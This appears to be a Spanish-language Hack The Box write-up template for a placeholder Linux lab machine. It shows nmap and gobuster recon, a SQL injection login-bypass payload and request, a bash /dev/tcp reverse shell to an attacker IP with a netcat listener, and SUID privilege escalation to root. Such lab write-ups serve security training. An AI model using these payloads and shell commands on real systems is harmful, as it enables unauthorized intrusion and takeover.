# HTB - Example Machine

!!! info "Información"
    - **OS:** Linux
    - **Dificultad:** 🟢 Easy
    - **IP:** 10.10.10.XX
    - **Técnicas:** SQL Injection, SUID Exploitation

## Reconocimiento

### Nmap

```bash
nmap -sCV -p- --min-rate 5000 10.10.10.XX -oN nmap.txt
```

??? example "Resultado"
    ```text
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1
    80/tcp open  http    Apache httpd 2.4.41
    ```

### Web Enumeration

```bash
gobuster dir -u http://10.10.10.XX -w /usr/share/wordlists/dirb/common.txt
```

!!! warning "Hallazgo"
    Encontrado panel de login en `/admin`

## Explotación

### SQL Injection

!!! tip "Tip"
    Siempre probar payloads básicos de SQLi en formularios de autenticación antes de usar herramientas automatizadas.

El formulario de login es vulnerable a SQLi:

=== "Payload"
    ```sql
    ' OR 1=1-- -
    ```

=== "Request"
    ```http
    POST /admin/login.php HTTP/1.1
    Host: 10.10.10.XX
    
    username=admin&password=' OR 1=1-- -
    ```

### Reverse Shell

```bash
bash -i >& /dev/tcp/10.10.14.XX/443 0>&1
```

!!! note "Listener"
    No olvides iniciar el listener antes: `nc -nlvp 443`

## Escalada de Privilegios

### Enumeración

```bash
find / -perm -4000 2>/dev/null
```

!!! danger "SUID Binary"
    `/usr/bin/custom_binary` tiene SUID y es explotable

### Root

```bash
/usr/bin/custom_binary -e '/bin/bash -p'
```

## Flags

| Flag | Hash |
|------|------|
| User | `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
| Root | `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |

---

!!! success "Lecciones aprendidas"
    - Siempre probar SQLi en formularios de login
    - Enumerar binarios SUID como parte del proceso de privesc
    - Mantener notas organizadas durante el proceso
